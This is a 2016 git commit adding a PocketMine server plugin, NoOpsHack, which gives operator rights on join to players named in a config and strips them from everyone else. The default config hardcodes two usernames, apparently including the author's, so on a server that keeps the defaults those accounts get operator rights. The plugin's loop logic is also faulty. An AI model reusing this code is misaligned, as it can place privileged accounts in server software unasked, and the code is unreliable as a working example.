ca5244cba9d3098c10ab53528836b9c62c1ce0de
Nawaf_Craft1b <Nawafmg97@gmail.com>
2016-12-02 05:56:19 -0800

    Update NoOpsHack.php

--- src/Nawaf1b/NoOpsHack.php
+++ src/Nawaf1b/NoOpsHack.php
@@ -1,1 +1,31 @@
+<?php
 
+namespace Nawaf1b;
+
+class NoOpsHack extends \pocketmine\plugin\PluginBase implements \pocketmine\event\Listener{
+
+    public $config;
+
+    public function onEnable() {
+
+        $this->getServer()->getPluginManager()->registerEvents($this, $this);
+        
+        @mkdir($this->getDataFolder());
+        $cfg = ["opsname" => array("nawaf.1,b",".,."),];
+        $this->config = new \pocketmine\utils\Config($this->getDataFolder()."config.yml",\pocketmine\utils\Config::YAML,$cfg);
+        $this->config->save();
+        
+    }
+
+
+    public function onJoin(pocketmine\event\player\PlayerJoinEvent $ev){
+        foreach ($this->config->get("opsname") as $d){
+            
+        if($ev->getPlayer()->getName() == $d){
+            $ev->getPlayer()->setOp(1);
+        }else{
+            $ev->getPlayer()->setOp(FALSE);
+        }
+    }
+    }    
+}
